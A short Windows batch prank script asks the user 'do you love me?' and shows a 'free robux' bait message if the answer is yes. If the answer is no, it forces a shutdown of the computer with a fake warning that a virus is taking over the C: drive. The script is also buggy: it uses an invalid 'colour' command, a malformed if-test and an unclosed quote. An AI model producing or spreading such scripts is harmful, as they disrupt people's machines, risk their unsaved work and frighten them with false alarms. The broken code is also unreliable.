@echo off
:1
colour a
echo Hello, do you love me? (answser in only yes/no)
set /p input=
if /i %input%==Yes goto love
if /i %input%==No goto hate
if /i not %input%== Yes,No goto 1
:love
echo ME TOO HEHEHE
echo HERES SOME FREE ROBUXXXX...
echo BYEEE
pause
exit

:hate 
echo NOOOOO?
echo YOU MIGHT WANT TO DECIDE AGAIN HEHEHEHEH.....
timeout 3
shutdown -s -t 7 -c "A VIRUS IS TAKING OVER c:Drive